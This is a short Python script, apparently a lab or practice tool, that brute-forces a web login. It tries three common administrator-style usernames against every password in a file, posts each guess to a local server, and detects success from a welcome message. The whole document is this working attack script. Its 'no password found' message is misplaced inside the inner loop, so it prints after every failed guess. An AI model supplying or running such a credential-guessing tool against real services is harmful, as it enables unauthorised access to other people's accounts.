import requests
import sys

target = "https://127.0.0.1:5000"
usernames = ['admin', 'user', 'administrator']
password = 'passwords.txt'
needle = 'Welcome back!'

for username in usernames:
    with open(password, 'r') as password_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("Attempting user: password -> {} : {} \r". format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username":username, "password":password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("Valid password found for [{}] -> [{}]".format(username, password.decode()))
                sys.exit()
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("No password found for '{}'".format(username))
            sys.stdout.write("\n")